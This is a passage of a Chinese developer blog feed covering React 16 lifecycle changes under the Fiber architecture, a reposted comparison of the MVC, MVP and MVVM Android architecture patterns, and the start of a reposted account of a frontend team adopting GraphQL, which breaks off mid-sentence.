console.log(&quot;componentDidUpdate方法执行&quot;)</span><br><span class="line">  console.log(&quot;从 getSnapshotBeforeUpdate 获取到的值是&quot;, valueFromSnapshot)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getSnapshotBeforeUpdate</code> 的设计初衷是为了 “与 <code>componentDidUpdate</code> 一起，覆盖过时的<code> componentWillUpdate</code>”。</p><p>**为什么废除 <code>componentWillUpdate</code>**，是因为它不适合 Fiber 架构。</p><h3 id="卸载阶段-1"><a href="#卸载阶段-1" class="headerlink" title="卸载阶段"></a>卸载阶段</h3><p>与 React 15 完全一致</p><h1 id="React-16-为何做出两次改变"><a href="#React-16-为何做出两次改变" class="headerlink" title="React 16 为何做出两次改变"></a>React 16 为何做出两次改变</h1><p><strong>Fiber 架构简析</strong></p><blockquote><p>使 Virtual DOM 可以进行增量式渲染</p></blockquote><p><strong>Fiber 会使原本同步的渲染过程变成异步的</strong></p><p>在 React 16 之前，每次组件更新，React 都会构建虚拟 DOM，再与旧虚拟 DOM 对比 diff，最后对真实 DOM 定向更新。</p><p><strong>同步调用的调用栈非常深</strong>，需要等到递归调用都返回后，整个渲染才算结束。</p><p>这个“漫长”的同步渲染过程不可被打断，存在巨大风险；同步渲染一旦开始，会占据主线程，直到彻底完成；在这个过程中，浏览器无法处理其他任务包括用户交互，甚至可能出现卡顿至卡死的风险。</p><p>React 16 引入的 Fiber 架构，可以解决这个风险：<strong>Fiber 会将一个大的更新任务拆解为多个小任务</strong>；每次执行完成一个小任务，渲染线程都会交还主线程给浏览器，然后处理优先级更高的工作，进而避免同步渲染导致的卡顿。</p><blockquote><p>React 渲染的过程可以被中断，可以将控制权交回浏览器，让位给高优先级的任务，浏览器空闲后再恢复渲染。</p></blockquote><h3 id="从-Fiber-架构角度看生命周期"><a href="#从-Fiber-架构角度看生命周期" class="headerlink" title="从 Fiber 架构角度看生命周期"></a>从 Fiber 架构角度看生命周期</h3><p>Fiber 架构的重要特征就是渲染过程<strong>可以被中断</strong>。根据这个特征，React 16 的生命周期被划分为 Render 和 Commit 两个阶段，而 Commit 阶段又被细分为 Pre-commit 和 Commit 阶段。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-e4166579fdeb8f55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Fiber"></p><ul><li>Render 阶段：纯净且不包含副作用。可能会被 React 暂停，中止或重新启动。</li><li>Pre-commit 阶段：可以读取 DOM。</li><li>Commit 阶段：可以使用 DOM，运行副作用，安排更新。</li></ul><p>也就是说在 Render 阶段允许被中断，而 Commit 阶段不能。原因很简单，Render 阶段的操作对于用户不可感知，所以中断、重启对于用户而言是不可见的。而 Commit 阶段的操作是对真实 DOM 的渲染，不能随意中断、重渲染。</p><h3 id="React-16-“废旧立新”背后的思考"><a href="#React-16-“废旧立新”背后的思考" class="headerlink" title="React 16 “废旧立新”背后的思考"></a>React 16 “废旧立新”背后的思考</h3><p>Fiber 架构下，<strong>Render 阶段允许被暂停、终止和重启</strong>。当一个任务执行一段后被中断，下一次抢回渲染线程时，这个任务会“重复执行一遍整个任务”而不是接着上一次执行的地方。这导致了 Render 阶段的生命周期方法有可能重复执行。</p><p>React 16 废弃的生命周期方法：</p><ul><li>componentWillMount</li><li>componentWillUpdate</li><li>componentWillReceiveProps</li></ul><p>这些方法都处于 Render 阶段，而且这些方法常年被滥用，在重复执行的过程中存在很大的风险。</p><p>我们的编码中的一些不好的习惯，在 “componentWill” 开头的生命周期里做一些事情：</p><ul><li>setState()</li><li>fetch 异步请求</li><li>操作真实 DOM</li><li>…</li></ul><p>这些操作的问题：</p><ol><li>可以转移到其他生命周期（componentDid…）里去做</li><li>Fiber 架构下，可能导致非常严重的 Bug</li><li>在 React 15 中也有出现过问题（在 <code>componentWillReceiveProps </code>和 <code>componentWillUpdate </code>里滥用 setState 导致重渲染死循环）</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>React 16 改造生命周期的主要原因是为了配合 Fiber 架构带来的异步渲染机制。</li><li>针对生命周期中长期被滥用的部分推出了具有强制性的最佳实践。</li><li>确保了 Fiber 架构下的数据和视图的安全，以及确保了生命周期方法的行为更加可控、可预测。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> React &amp; JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android架构之MVC、MVP、MVVM详解</title>
      <link href="/2023/04/07/Android%E6%9E%B6%E6%9E%84%E4%B9%8BMVC%E3%80%81MVP%E3%80%81MVVM%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/04/07/Android%E6%9E%B6%E6%9E%84%E4%B9%8BMVC%E3%80%81MVP%E3%80%81MVVM%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://qwerhuan.gitee.io/2020/08/16/android/android-jia-gou-zhi-mvc-mvp-mvvm-xiang-jie/">Android架构之MVC、MVP、MVVM详解</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你好！<br>我是一只修仙的猿，欢迎阅读我的文章，希望能让你有所收获。</p><p>MVC、MVP、MVVM均为架构模式，应用在Android上，称为Android架构模式。可能你会觉得我在讲废话，清楚他的定义非常重要。这样会有几个问题：</p><blockquote><p>什么是架构模式？什么是android架构模式？<br>MVC、MVP、MVVM的本质区别是什么？<br>他们在android上的应用是怎么样的？<br>我们该如何选择？</p></blockquote><p>弄清楚这几个问题，可以帮助我们更好地理解这三种架构模式，继而更好地运用它们。</p><p>这篇文章主要的内容是带你了解什么是架构以及android架构，以及详解三种架构模式的本质。</p><p>笔者才疏学浅，有不同观点欢迎评论区或私信讨论。如需转载私信告知即可。<br>另外欢迎阅读笔者的个人博客一只修仙的猿的个人博客，更精美的UI，拥有更好的阅读体验。</p><h3 id="本文目录"><a href="#本文目录" class="headerlink" title="本文目录"></a>本文目录</h3><p><img src="https://upload-images.jianshu.io/upload_images/15531792-0275fc695899a7fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="架构以及Android架构"><a href="#架构以及Android架构" class="headerlink" title="架构以及Android架构"></a>架构以及Android架构</h1><p>架构，即为骨架，是指导开发的关键。例如一个人，身体的骨骼即为身体的架构，有了基本骨架之后，才可以决定在头颅里开发大脑，在肋骨中开发肺部等。软件开发也是如此，也需要一个“骨架”，即架构。他可以指引我们什么地方该做什么事情，让整个软件的开发思路非常清晰。</p><p>Android架构，即为开发android时使用的架构。Android的开发一般分为三部分：UI逻辑，业务逻辑和数据操作逻辑。这里可以举个例子</p><blockquote><p>获取天气详情并展示。首先要写布局xml，接着在Activity中获取到view实例。此为UI逻辑。然后需要通过网络请求获得数据，此为数据操作逻辑。接着获取到数据后，需要将数据进行缓存，解析，再set到view上进行展示，此为业务逻辑。</p></blockquote><p>Android架构，就是为了更好地协调这三者的关系。达到：</p><blockquote><p>1.各模块高内聚低耦合的状态，方便进行团队分工合作开发。<br>2.代码思路清晰，提高代码的可维护性与可测试性。<br>3.减少样板代码，提高开发效率，减少开发错误。</p></blockquote><p>为了达到这些目的，所以才有各种架构不断涌现，却没有一个统一的开发框架。不同于移动端，web端开发有成熟的SpringMVC框架，可以快速规范地开发一个项目。而移动端缺乏框架的支撑，各路大神各显神通，不断涌现了不同的架构模式来适应不同的开发情景，如MVC，MVP等等。但由于没有历史的沉淀，各种架构模式的弊端也渐渐浮出水面。在这种情境下，谷歌退出了架构组件，用成熟的框架来减少样板代码，提高开发效率，有如SpringMVC的风范，这就是MVVM的框架实现。下面我们就详细展开讲这些架构模式。</p><h1 id="详解三种架构模式"><a href="#详解三种架构模式" class="headerlink" title="详解三种架构模式"></a>详解三种架构模式</h1><h3 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h3><p>Android上的MVC架构我认为是来源于web开发的SpringMVC，MVC全名为Model-View-Controller，图解如下<br><img src="https://upload-images.jianshu.io/upload_images/15531792-81893c39a9b553d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>View：负责与用户交汇，显示界面。</li><li>Controller：负责接收来自view的请求，处理业务逻辑。</li><li>Model：负责数据逻辑，网络请求数据以及本地数据库操作数据等。</li></ul><p>在MVC架构中，Controller是业务的主要承载者，几乎所有的业务逻辑都在Controller中进行编写。而View主要负责UI逻辑，而Model是数据逻辑，彼此分工。</p><blockquote><p>MVC的本质就是按照UI逻辑、业务逻辑、数据逻辑不同的职责分三大模块，彼此分工。</p></blockquote><p>在Android中，view一般使用xml进行编写，但xml的能力不全面，需要Activity进行一些UI逻辑的编写，因而MVC中的V即为xml+Activity。Model数据层，在Android中负责网络请求和数据库操作，并向外暴露接口。Controller是争议比较多的写法：一种是直接把Activity当成Controller；一种是独立出Controller类，进行逻辑分离。比较符合MVC思想的笔者认为是后者。因为前者直接在Activity中进行书写业务逻辑就会和UI逻辑混合在一起了，达不到模块分工的效果。MVC架构的处理流程一般是：</p><ul><li>view接收用户的点击</li><li>view请求controller进行处理或直接去model获取数据</li><li>controller请求model获取数据，进行其他的业务操作</li><li>这一步可以有多种做法：</li></ul><p>1.利用callBack从controller进行回调<br>2.把view实例给controller，让controller进行处理<br>3.通知view去model获取数据</p><blockquote><p>举个栗子。<br>现在有一个获取天气详情的功能。我需要在xml中写ui，在Activity中给控件设置监听事件和写方法给控件set数据，如textView.setText()。当点击界面按钮时，会调用首先会调用onClickListener，然后再调用Controller的方法让model获取数据，获取完成后通知view，view去Model获取数据更新自己。或者Activity直接给Controller一个callBack，controller就可以在业务处理完成后进行回调；或者直接把view给controller让controller直接去更新ui。</p></blockquote><p>MVC可能是我们第一次开发安卓的时候就会使用的架构模式。直接在Activity中书写业务逻辑，只抽离出Model层。（笔者第一次开发时连Model层都没抽离，全部在Activity中写，一千多行的MainActivity）这样看起来很美好，但是有严重的问题。MVC的核心就是按照职责分离代码。但几乎所有的业务逻辑代码都在controller中，当项目越来越大时会导致controller极度臃肿，难以维护。view与model直接依赖，模块之间依赖不单一，view因直接通过model获取数据，不可避免的会耦合一些业务代码。</p><blockquote><ul><li>几乎所有的业务逻辑代码都在controller中进行，会导致非常臃肿，降低项目的可测试性与可维护性。</li><li>view直接持有controller和model实例，不同职责的代码进行耦合，导致代码耦合性高，模块分工不清晰。</li></ul></blockquote><p>但MVC也有他的好处：简单。他不需要写很多的代码来让代码解耦，这在小型项目非常有用。小型项目总体的代码就不多，所以这样可以提高开发效率。但是最好不要尝试维护他，不是怕你崩溃，而是怕你砸了电脑对电脑不好。<br>因为可以发现MVC的改进方向就是：</p><blockquote><ul><li>对模块进行更加彻底的分离，不要让view和model直接联系。</li><li>对controller进行减压。</li></ul></blockquote><h3 id="MVP"><a href="#MVP" class="headerlink" title="MVP"></a>MVP</h3><p>相比MVC，MVP的更加的完善。MVP全名是Model-View-Presenter。图解如下：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-307983c80c12283f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>View：UI模块，负责界面显示和与用户交汇。</li><li>Presenter：负责业务逻辑，起着连接View和Model桥梁的作用。</li><li>Model：专注于数据逻辑。</li></ul><p>MVP和MVC的区别很明显就在这个Presenter中。为了解决MVC中代码的耦合严重性，把业务逻辑都抽离到了Presenter中。这样View和Model完全被隔离，实现了单向依赖，大大减少了耦合度。view和prensenter之间通过接口来通信，只要定义好接口，那么团队可以合作同时开发不同的模块，同时不同的模块也可以进行独立测试。也因各模块独立了，所以要只要符合接口规范，即可做到动态更换模块而不需要修改其他的模块。</p><p>在Android中，需要让Activity提供控件的更新接口，prensenter提供业务逻辑接口，Activity持有presenter的实例，prensenter持有Activity的弱引用（不用直接引用是为了避免内存泄露），Activity直接调用prensenter的方法更新界面，prensenter去model获取数据之后，通过view的接口更新view。如下图：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-183973153fce5dc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>不同的view可以通过实现相同的接口来共享prensenter。presenter也可以通过实现接口来实现动态更换逻辑。Model是完全独立开发的，向外暴露的方法参数中含有callBack参数，可以直接调用callBack进行回调。<br>总结一下：</p><blockquote><ul><li>MVP通过模块职责分工，抽离业务逻辑，降低代码的耦合性</li><li>实现模块间的单向依赖，代码思路清晰，提高可维护性</li><li>模块间通过接口进行通信，降低了模块间的耦合度，可以实现不同模块独立开发或动态更换</li></ul></blockquote><p>MVP的最大特点就是接口通信，接口的作用是为了实现模块间的独立开发，模块代码复用以及模块的动态更换。但是我们会发现后两个特性，在Android开发中使用的机会非常少。presenter的作用就是接受view的请求，然后再model中获取数据后调用view的方法进行展示，但是每个界面都是不同的，很少可以共用模块的情景出现。这就导致了每个Activity/Fragment都必须写一个IView接口，然后还需要再写个IPresenter接口，从而产生了非常多的接口，需要编写大量的代码来进行解耦。如果在小型的项目，这样反而会大大降低了开发效率。<br>其次，prensenter并没有真正解耦，他还需要调用view的接口进行UI操作，解耦没有彻底。MVP也没有解决MVC中Controller代码臃肿的问题，甚至还把部分的UI操作带到了Presenter中。</p><p>因此，由于MVP有：</p><blockquote><ul><li>过度设计导致接口过多，编写大量的代码来实现模块解耦，降低了开发效率</li><li>并没有彻底进行解耦，prensenter需要同时处理UI逻辑和业务逻辑，presenter臃肿</li></ul></blockquote><p>这样的缺点，android开发者都在寻找一个更加完善的架构模式。当然读者知道下面我要讲MVVM了，但我想要说的是其实还有如AAC等结构模式的存在，但因他们的局限性以及上手难度，并没有被广泛使用。而到了MVVM，谷歌通过一系列的架构组件来让开发者可以简单地实现MVVM架构。</p><p>MVVM<br>终于到了MVVM，可能很多人都感觉“卧槽这么牛逼的架构我肯定学不会”然后被劝退了继续使用MVC或者MVP。在我看来，MVVM和上面两种架构模式一样都是一种架构思想，只是谷歌推出了jetpack架构组件来让我们更好的使用这种架构模式。</p><h3 id="MVVM，全名为Model-View-ViewModel。图解："><a href="#MVVM，全名为Model-View-ViewModel。图解：" class="headerlink" title="MVVM，全名为Model-View-ViewModel。图解："></a>MVVM，全名为Model-View-ViewModel。图解：</h3><p><img src="https://upload-images.jianshu.io/upload_images/15531792-5dcad5d347b8ea58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>View：和前面的MVP、MVC中的View一样，负责UI界面的显示以及与用户的交汇。</li><li>Model：同样是负责网络数据获取或者本地数据库数据获取。</li><li>ViewModel：负责存储view的数据映像以及业务逻辑。</li></ul><p>MVVM的view和model和前面的两种架构模式是差不多的，重点在ViewModel。viewModel通过将数据和view进行绑定，修改数据会直接反映到view上，通过数据驱动型思想，彻底把MVP中的Presenter的UI操作逻辑给去掉了。而viewModel是绑定于单独的view的，也就不需要进行编写接口了。但viewModel中依旧有很多的业务逻辑，但是因为把view和数据进行绑定，这样可以让view和业务彻底的解耦了。view可以专注于UI操作，而viewModel可以专注于业务操作。因而：</p><blockquote><ul><li>MVVM通过数据驱动型思想，彻底把业务和UI逻辑进行解耦，各模块分工职责明确。</li></ul></blockquote><p>View只需要关注Viewmodel的数据部分，而无需知道数据是怎么来的；而ViewModel只需要关注数据逻辑，而不需要知道UI是如何实现的。View可以随意更换UI实现，但ViewModel却完全不需要改变。</p><p>但依旧存在的问题是：viewModel会依旧很臃肿；需要一个绑定框架来对view和数据对象进行绑定。这是MVVM的两大弊端。上面的两种架构模式都是不需要框架的，但MVVM必须要有一个view-data绑定框架，来实现对data的更改可以实时反映到view上，这就造成了需要有一定的上手难度：学习框架。</p><blockquote><ul><li>MVVM的viewModel依旧很臃肿。</li><li>MVVM需要学习数据绑定框架，具有一定的上手难度。</li></ul></blockquote><p>为了解决上面两个问题，需要：1.简单易用的框架；2.为viewModel减少压力。所以谷歌推出了适合android开发的MVVM架构模式：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-56f7407722fca66b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>做个简单的解析：</p><ul><li>View对应的就是Activity和Fragment，在这里进行UI操作。</li><li>ViewModel中包含了LiveData，这是一种可观察数据类型框架。View通过向LIveData注册观察者，当LiveData发生改变时，就会直接调用观察者的逻辑把数据更新到view上。</li><li>ViewModel完全不需要关心UI操作，只需要专注于数据与业务操作。</li><li>Repository代表了Model层，Repository对ViewModel进行了减压，把业务操作般到了Repository中，避免了viewModel臃肿。</li><li>Repository对请求进行判断是要到本地数据库获取还是网络请求获取分别调用不同的模块。</li></ul><p>这样，谷歌通过推出简单易用的架构框架，解决了我们上面讲的MVVM的两大问题，让MVVM架构达到了一种非常“完美”的境界。也是谷歌推荐的架构模式。</p><p>但为什么好像，MVVM使用的人还是那么少呢？因为jetpack的架构组件库，可不止是一个LiveData这么简单，他是一整套完整的架构组件库，包括了：DataBinding，LiveData，ViewModel，Navigation，Lifecycle。下面我们简单了解一下每个组件的功能：</p><blockquote><p><strong>DataBinding：</strong></p><ul><li>解基于数据驱动思想，决视图调用一致性问题，实现双向绑定</li><li>避免编写样板式代码，提高效率</li></ul><p><strong>LiveData：</strong></p><ul><li>通过唯一可信源获取数据，正确分发数据</li><li>与Lifecycle结合，拥有生命周期感知能力，配合viewModel实现作用域可控</li><li>实现模块的单向依赖，抛弃接口回调</li></ul><p><strong>ViewModel：</strong></p><ul><li>托管界面状态，解决状态管理问题</li><li>实现跨页面数据分享，并为数据设置作用域，做到作用域可控</li><li>实现单向依赖，避免内存泄露</li></ul><p><strong>Lifecycle：</strong></p><ul><li>以简便地方式解决生命周期管理的一致性问题</li><li>避免内存泄露的情况下让第三方组件随时获取生命周期状态，追踪事故所在的生命周期源，对错过时机的异步操作及时停止</li></ul><p><strong>Navigation</strong></p><ul><li>通过遵循导航定则实现对Fragment的管理</li></ul><p>感觉对上面的作用没看懂，没关系，这不是本文的重点。通过列举这些组件的作用，我想表达的是：此时的MVVM已经不只是架构意义上的MVVM，而是框架层次上的。谷歌针对android开发的各种问题，定制各种各样的架构组件，结合MVVM思想，让我们的开发更加的简便和代码更加的健壮。</p></blockquote><p>我们只需要遵循他的开发规范，使用他的架构框架，就可以开发出非常健壮的项目，有如Spring全家桶的风范。而众多的库，则足以劝退很多的开发者，而在公司的项目，对于框架的不熟悉与不可预期，不知道框架中会不会有什么坑，所以导致了公司项目使用的MVVM的人非常少，至少在我目前了解到的公司，均没有使用此架构。</p><blockquote><ul><li>框架众多，学习成本高。</li><li>框架使用少，对框架不熟悉，容易产生不可预期的异常且无法处理。</li></ul></blockquote><p>到这里我们会发现我们平常讲的MVVM并不只是简单的MVVM架构思想，更多的是指谷歌推出的一系列架构组件。MVVM的本质是什么？</p><blockquote><p>一种基于数据驱动型，将UI逻辑和业务逻辑彻底分离的架构模式。</p></blockquote><p>而我们平常说的“MVVM”是什么？</p><blockquote><p>基于软件工程背景下，谷歌官方推出的一整套结合MVVM使用的架构组件。让开发者可以更简便，更高效率开发出非常健壮的代码。</p></blockquote><p>关于如何实现谷歌意义上的MVVM架构模式，这涉及到框架组件的使用，这里不深入讲解。本文的目的是讲解架构思想，框架的使用，读者可前往官网自行学习。</p><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><blockquote><p>从应用范围来说，MVC和MVP属于广义上的架构模式，MVVM属于专用于页面开发的架构模式。</p></blockquote><p>MVC是不同职责代码的解耦，MVP在MVC的基础上实现了模块间的进一步解耦。在生活中很多地方可以看到他们的影子</p><blockquote><p>MVC举个洗衣机的例子。我们看到的操作面板就是View；里面的智能预定流程漂洗等属于Controller；洗衣机里的洗衣功能是model。这样我们通过view来请求controller设置洗衣流程，然后点击启动直接让model开始运作。这就可以看成一个MVC的例子。</p><p>MVP举个充电线的例子。我们的手机可以看成是View；充电线是Presenter；插座是Model。手机向充电线暴露Type-c接口，而充电线向手机暴露对应的type-c插口。只要两者都符合这个接口规范即可，而不管具体是如何实现的。我们可以随意更换充电线，只要是type-c类型的就可以。我们也可以让一根充电线给不同的手机充电， 只要都是type-c接口就行。而插座和充电线之间的关系也是如此，但是插座会更加独立，因为全世界的插座都是这样，就像我们使用callBack一样。这些就体现了MVP的特点：不同职责模块分离，接口通信。</p></blockquote><p>是吧，可以看到这两套思想是广义上的架构思想，但MVVM则不是。MVVM是专注于页面开发的。为什么这么说？MVVM的本质是把View和view要显示的数据对象进行分离绑定，通过数据驱动型思想彻底解耦UI和业务逻辑。前提要有view也就是页面，还有数据。所以他的应用场景就被限制到页面开发中来了。我们不可能在洗衣机充电线上运用MVVM。因为没有页面和数据对象可言。所以：</p><blockquote><p>MVC是不同职责代码分离，MVP是在MVC的基础上通过接口通信降低模块间的耦合性，MVC，MVP都是广义上的架构模式，Android只是他们的一个应用场景。MVVM是专注于页面开发的架构模式，更加契合页面开发模式。</p></blockquote><p>相信读者们都有一个问题：哪个架构模式是最好的？我应该选择哪个架构模式？是不是MVVM更加契合页面开发所以MVVM一定是最优解？</p><blockquote><p>没有一定是最好的架构模式，只有特定情景下最适合的架构模式。</p></blockquote><p>架构模式都是对于特定情景应运而生的，他是为了解决某个情景下的开发架构问题。例如android的问题是UI与业务逻辑的解耦，但充电线却是需要模块间的解耦。</p><p>那对于Android这个情景来说MVVM一定是最优解吗？当然不是。Android开发也是有很多的情景的，项目的大小，是否要进行维护，对时间有没有要求，项目紧急程度等等。首先要了解得是各大架构模式的优缺点。MVVM由于架构的加持，导致入手成本高，前期投入架构设计代码量多。如果只是一个微型项目，需要在一天内完成（别问我一天怎么完成）那么此时采用mvvm就有点不太适合了，可能搭完架构就已经过去半天了。这个时候因为项目代码很少，且要快速开发，使用MVC就是最合适的了。如果是中型项目，且涉及到团队开发，但是团队对于MVVM的框架并不熟悉，这个时候去学习MVVM再进行开发也是不太实际的，因为框架越多，可能出错的地方就越多，更何况是刚学的。这个时候模块间分离的MVP架构模式就似乎更加的适合了。所以，要根据不同的情景选择最适合的架构模式。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章我们讲了是什么是架构和三种架构模式MVC、MVP、MVVM的架构思想，最后再讲了三种架构的区别与选择。相信通过这篇文章读者可能对这三种架构有了一定的认识。一个完美的架构模式是一个架构师一生的追求，在使用的时候我们可以多多思考这些架构模式的本质以及背景，想想架构师为什么这么设计，可以帮我们更好地理解架构。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li>《第一行代码》第三版</li><li>完全解析Android项目架构(1) - MVC</li><li>完全解析Android项目架构(2) - MVP</li><li>完全解析Android项目架构(3) - MVVM</li><li>是让人耳目一新的 Jetpack MVVM 精讲啊！</li><li>是让人提神醒脑的 MVP、MVVM 关系精讲！</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码之上：我们落地 GraphQL 背后的故事</title>
      <link href="/2023/04/07/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%8A%EF%BC%9A%E6%88%91%E4%BB%AC%E8%90%BD%E5%9C%B0-GraphQL-%E8%83%8C%E5%90%8E%E7%9A%84%E6%95%85%E4%BA%8B/"/>
      <url>/2023/04/07/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%8A%EF%BC%9A%E6%88%91%E4%BB%AC%E8%90%BD%E5%9C%B0-GraphQL-%E8%83%8C%E5%90%8E%E7%9A%84%E6%95%85%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://zhuanlan.zhihu.com/p/141629697">代码之上：我们落地 GraphQL 背后的故事</a></p><p>GraphQL 经常被打上“好东西，但是难以落地”的标签，很多尝试 GraphQL 的团队也经历了“从入门到放弃”的痛苦。而我们能够在过去一年多的时间里让 GraphQL 在项目中平稳落地，其背后是一个技术决策、工程管理和代码相结合的有趣故事。</p><p>在这篇文章中我会按照故事的时间顺序讲述：</p><p>启蒙期：为什么我们需要 GraphQL<br>原型期：熟悉 GraphQL，熟悉社区<br>蜜月期：在内部系统中应用 GraphQL 并快速收获成果<br>接入期：做个浏览器内运行的 GraphQL 网关<br>痛点期：前、后端同时遭遇挫折<br>落地期：把握机会，真正的 GraphQL</p><h3 id="为什么我们需要-GraphQL"><a href="#为什么我们需要-GraphQL" class="headerlink" title="为什么我们需要 GraphQL"></a>为什么我们需要 GraphQL</h3><p>在谈“为什么”之前，首先说说“我们”是谁。</p><p>我们是 SmartX 的前端团队。相信和我们一样，很多公司内引入 GraphQL 都是由前端团队发起的。不同之处在于从最开始我们就不希望给后端团队带来任何额外工作量，下文中我们会逐步讲述我们如何做到这一点，但毫无疑问这是我们最终成功的重要基础。</p><p>再说我们“为什么需要”。2019 年 1 月，GraphQL 第一次在组内讨论中被写到了白板上，当时组内没有任何一个人对 GraphQL 有实质性的了解，提起只是因为我们想要解决前端项目中复杂的数据拼接问题，而 GraphQL 在我们的印象中是一个擅长数据拼接的技术方案。</p><p>在我们的前端项目中数据拼接有多复杂？可以从以下这个不完全真实（但复杂程度是接近的）的示意图里感受一下：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-3d68b1372edc25d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>一个看起来并不复杂的 UI 内使用了多个服务的 API，并且这些 API 可能由多个组开发，在格式、语义、异常处理上都有一定的差异性，因此一个“可以拼接数据、按需获取的规范”就成为了我们最初的诉求。</p><h3 id="不止拼接，GraphQL-的工程价值"><a href="#不止拼接，GraphQL-的工程价值" class="headerlink" title="不止拼接，GraphQL 的工程价值"></a>不止拼接，GraphQL 的工程价值</h3><p>在后续各个阶段的实践中，我们很快意识到 GraphQL 提供的远不止减少网络请求数量、按需获取数据这么简单，它还为我们带来更多工程价值。</p><h4 id="强类型接口定义避免前后端不一致"><a href="#强类型接口定义避免前后端不一致" class="headerlink" title="强类型接口定义避免前后端不一致"></a>强类型接口定义避免前后端不一致</h4><p>在 GraphQL 的规范中，前后端都需要静态的声明接口和请求的结构。例如后端提供 User 接口，声明其中包含 name 和 email 两个字段。</p><p>如果前端对 User 发起请求，错误地请求了不存在的字段 age 字段，那么在静态阶段（编译、lint 等）我们就有能力发现这个错误。</p><p>同样地，如果后端在某一个版本中引入了一个 breaking change，将 email 字段重命名为 email_address，前端项目中使用了 User.email 的请求也可以在静态阶段发现问题，而不需要在运行时通过测试暴露。</p><p>虽然这些问题都可以通过人为的沟通、联调来避免，但效率和可靠程度显然不是一个层次的。</p><p>另一方面，如果前端项目中使用了 Typescript 等强类型语言，也可以通过工具链从 GraphQL 接口定义中生成 Typescript 类型声明，让整个数据请求的链路上处处都是类型安全的，并且没有额外的维护成本。</p><h4 id="响应式的级联缓存"><a href="#响应式的级联缓存" class="headerlink" title="响应式的级联缓存"></a>响应式的级联缓存</h4><p>UI 里的数据管理是一个更复杂的话题，值得一篇<a href="https://link.zhihu.com/?target=http://www.myriptide.com/smart-cache-cn/">文章</a>单独讨论。这里我尝试用一个简单的示例说明基于 GraphQL 为什么更容易实现一个好用的客户端缓存。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-ccb10934a0a6b9ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>上图中有一个 Tab、一个 User 表格和一个 User 表单。如果从表单中修改了 Adam 的 Email 地址，我们期望通过 API 把最新的 Email 发给后端，并且把表格和表单中 Adam 的 Email 地址都显示为修改后的最新值。</p><p>如果我们希望 UI 的变化自动（而不是通过额外的业务逻辑）发生，就应该实现这样的一个缓存：</p><ol><li>响应式。<br>缓存既要知道 Adam 的 Email 地址对应的是 id 为 1 的 User 这条数据，也要知道有一个表格和一个表单正在”依赖“这条数据。当数据发生变化时，缓存要”通知“这些依赖了对应数据的 UI 重新渲染一次，更新到最新状态。 当 UI 不再”依赖“这条数据时（例如通过 Tab 切换到了 Todo Tab，User 表格不再展示），该数据再发生变化时也不会再触发渲染。</li><li>级联<br>UI 对数据的使用可能来自不同的入口，例如获取所有 User 的 API、获取单个 User 的 API、获取一个 Todo 的创建者的 API。但不论入口来自哪里，缓存都能够通过 id 为 1 的 User 这条数据层层追溯，将它们关联在一起。</li></ol><p>GraphQL 可以让这一切更容易发生，因为：</p><ul><li>数据之间的关联关系在静态的 schema 中已经完整声明。</li><li>可以精确到字段级别的响应式。</li></ul><h4 id="好处都是前端的，工作量大部分是后端的"><a href="#好处都是前端的，工作量大部分是后端的" class="headerlink" title="好处都是前端的，工作量大部分是后端的"></a>好处都是前端的，工作量大部分是后端的</h4><p>从上文的描述中可以看出，很多工程价值都在于前端可以基于 GraphQL 更好的组织代码，但要提供一个 GraphQL API 的主要工作量却在于后端。</p><p>我们很早就认清了这一事实，并且做出了一个判断：GraphQL 对于网络请求的优化（数量、数据量）不是我们最看重的价值，我们可以在前端项目中实现一个运行在浏览器内的 GraphQL 网关，获得 GraphQL 带来的其它好处。这样的方式不需要后端的配合就可以独立完成，并且可以在足够成熟后快速转化为一个独立的 NodeJS 服务，完整享受 GraphQL 的所有优点。</p><p>不过在这么做之前，我们还有很多调研工作需要完成。</p><h3 id="快速取得成果"><a href="#快速取得成果" class="headerlink" title="快速取得成果"></a>快速取得成果</h3><p>2019 年春节过后，我们正式开始了对 GraphQL 的调研工作。为了加速调研的过程，我们同时开展了两方面的工作：</p><ol><li>熟悉 GraphQL 本身以及它的社区。</li><li>在严肃程度不那么高、但又有一定复杂度的项目中使用 GraphQL。</li></ol><h4 id="GraphQL-社区"><a href="#GraphQL-社区" class="headerlink" title="GraphQL 社区"></a>GraphQL 社区</h4><p>尽管 GraphQL 最初是由 Facebook 